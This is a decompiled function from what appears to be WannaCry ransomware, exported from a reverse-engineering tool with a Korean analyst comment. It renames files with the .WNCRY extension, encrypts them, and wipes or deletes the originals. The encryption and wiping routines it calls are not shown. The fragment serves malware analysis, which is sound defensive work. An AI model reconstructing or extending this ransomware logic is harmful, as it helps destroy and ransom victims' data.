// --- Metadata ---
// Function Name: encryptFilesAndExt_10002200
// Address: 0x10002200
// Exported At: 20250522_122146
// Signature: unknown_signature
// ---------------
int __thiscall encryptFilesAndExt_10002200(void *this, wchar_t *Source, int a3)
{
  wchar_t *v3; // edi
  wchar_t *v4; // eax
  wchar_t *v5; // esi
  int v6; // eax
  int result; // eax
  wchar_t *v8; // [esp-8h] [ebp-2ECh]
  wchar_t Destination[360]; // [esp+14h] [ebp-2D0h] BYREF

  if ( a3 != 4 )                                // 파일 확장자 조작 → 존재 확인·암호화 시도 → 원본 파일 로깅/삭제 
  {
    v3 = Source;
    swprintf(Destination, (const size_t)L"%s%s", Source, L".WNCYR");
    goto LABEL_8;
  }
  v3 = Source;
  wcscpy(Destination, Source);
  v4 = wcsrchr(Destination, 0x2Eu);
  v5 = v4;
  if ( !v4 )
  {
    v8 = Destination;
    goto LABEL_6;
  }
  v6 = wcsicmp(v4, L".WNCYR");
  v8 = v5;
  if ( v6 )
  {
LABEL_6:
    wcscat(v8, L".WNCRY");
    goto LABEL_8;
  }
  wcscpy(v5, L".WNCRY");
LABEL_8:
  if ( GetFileAttributesW(Destination) != -1 || EncryptFile_10001960((int)this, (int)v3, Destination, a3) )
  {
    if ( a3 == 4 )
      LogAndWipeFile_10002BA0((int)this, v3);
    result = 1;
  }
  else
  {
    DeleteFileW_0(Destination);
    result = 0;
  }
  return result;
}
